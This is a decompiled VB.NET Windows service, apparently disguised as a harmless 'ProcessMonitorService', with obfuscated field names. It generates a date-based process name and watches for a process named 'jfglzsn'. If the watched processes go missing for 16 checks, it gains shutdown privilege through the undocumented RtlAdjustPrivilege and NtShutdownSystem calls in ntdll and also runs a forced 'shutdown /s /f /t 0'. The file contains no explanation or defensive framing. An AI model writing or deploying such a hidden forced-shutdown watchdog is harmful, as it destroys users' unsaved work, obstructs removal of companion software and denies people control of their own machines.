Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Linq
Imports System.Runtime.InteropServices
Imports System.ServiceProcess
Imports System.Timers
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace zmserv

	<DesignerGenerated()>
	Public Class ProcessMonitorService
		Inherits ServiceBase

	
		Public Sub New()
			Me._GlobalMock = "C:\windows\jf"
			Me.AddClass()
		End Sub

	
		Private Declare Function RtlAdjustPrivilege Lib "ntdll.dll" (int_0 As Integer, int_1 As Integer, int_2 As Integer, ByRef int_3 As Integer) As Integer

	
		Private Declare Function NtShutdownSystem Lib "ntdll.dll" (int_0 As Integer) As Integer

	
		Protected Overrides Sub OnStart(args As String())
			' The following expression was wrapped in a checked-statement
			Dim num As Integer = DateAndTime.Month(DateAndTime.Now) * DateAndTime.Day(DateAndTime.Now)
			Dim num2 As Integer = num Mod 7
			Dim num3 As Integer = num Mod 9
			Dim num4 As Integer = num Mod 5
			Dim num5 As Integer = num Mod 3
			Dim text As String
			If num Mod 2 = 0 Then
				text = Conversions.ToString(Strings.Chr(97 + num2)) + Conversions.ToString(Strings.Chr(98 + num3)) + Conversions.ToString(Strings.Chr(101 + num4)) + Conversions.ToString(Strings.Chr(99 + num5))
			Else
				text = Conversions.ToString(Strings.Chr(97 + num3)) + Conversions.ToString(Strings.Chr(98 + num2)) + Conversions.ToString(Strings.Chr(101 + num5)) + Conversions.ToString(Strings.Chr(99 + num4))
			End If
			Me.m_UtilsMock = text
			Me.m_ProcessMock = text + ".exe"
			VBMath.Randomize(CDbl(num))
			Dim num6 As Long = CLng(Math.Round(CDbl(VBMath.Rnd()) * 100000.0 * 3.0 + 1.0))
			Dim text2 As String = ""
			Dim num7 As Integer = 1
			Do
				text2 = Conversions.ToString(Strings.Chr(CInt((num6 Mod 10L + 105L)))) + text2
				num6 /= 10L
				num7 += 1
			Loop While num7 <= 5
			Me.m_UtilsMock = text2
			Me.m_ProcessMock = text2 + ".exe"
			Me._SetterMock = 0L
			Me.m_TestsMock = New Timer(30000.0)
			Me.m_TestsMock.AutoReset = True
			AddHandler Me.m_TestsMock.Elapsed, AddressOf Me.RegisterClass
			Me.m_TestsMock.Start()
		End Sub

	
		Private Sub RegisterClass(sender As Object, e As ElapsedEventArgs)
			If Enumerable.Any(Of Process)(Process.GetProcessesByName("jfglzsn")) Then
				Me.readerMock = New Timer(5000.0)
				Me.readerMock.AutoReset = True
				AddHandler Me.readerMock.Elapsed, AddressOf Me.CallClass
				Me.readerMock.Start()
				Me.m_TestsMock.Dispose()
				Me.m_TestsMock = Nothing
			End If
		End Sub

	
		Private Sub CallClass(sender As Object, e As ElapsedEventArgs)
			If Not Enumerable.Any(Of Process)(Process.GetProcessesByName(Me.m_UtilsMock)) AndAlso Not Enumerable.Any(Of Process)(Process.GetProcessesByName("jfglzsn")) Then
				Dim ptr As Long = Me._SetterMock
				Me._SetterMock = ptr + 1L
				If Me._SetterMock >= 16L Then
					ProcessMonitorService.ForceShutdown()
					Process.Start("shutdown", "/s /f /t 0")
					Return
				End If
			Else
				Me._SetterMock = 0L
			End If
		End Sub

	
		Protected Overrides Sub OnStop()
			If Me.readerMock IsNot Nothing Then
				Me.readerMock.[Stop]()
				Me.readerMock.Dispose()
			End If
			If Me.m_TestsMock IsNot Nothing Then
				Me.m_TestsMock.[Stop]()
				Me.m_TestsMock.Dispose()
			End If
		End Sub

	
		Public Shared Sub ForceShutdown()
			Dim num As Integer = 0
			ProcessMonitorService.RtlAdjustPrivilege(19, 1, 0, num)
			ProcessMonitorService.NtShutdownSystem(2)
		End Sub

	
		Public Shared Sub ForceRestart()
			Dim num As Integer = 0
			ProcessMonitorService.RtlAdjustPrivilege(19, 1, 0, num)
			ProcessMonitorService.NtShutdownSystem(1)
		End Sub

	
		<DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				If disposing AndAlso Me.m_InterpreterMock IsNot Nothing Then
					Me.m_InterpreterMock.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

	
		<DebuggerNonUserCode()>
		<MTAThread()>
		Public Shared Sub Main()
			ServiceBase.Run(New ServiceBase() { New ProcessMonitorService() })
		End Sub

	
		<DebuggerStepThrough()>
		Private Sub AddClass()
			Me.m_InterpreterMock = New Container()
			MyBase.ServiceName = "Service1"
		End Sub

	
		Private readerMock As Timer

	
		Private m_TestsMock As Timer

	
		Private Const orderMock As Integer = 5000

	
		Private Const _FacadeMock As Integer = 30000

	
		Private _SetterMock As Long

	
		Private m_UtilsMock As String

	
		Private m_ProcessMock As String

	
		Private Const refMock As Integer = 19

	
		Private Const m_MessageMock As Integer = 0

	
		Private Const _ContainerMock As Integer = 1

	
		Private Const rulesMock As Integer = 2

	
		Private _GlobalMock As String

	
		Private m_InterpreterMock As IContainer
	End Class
End Namespace
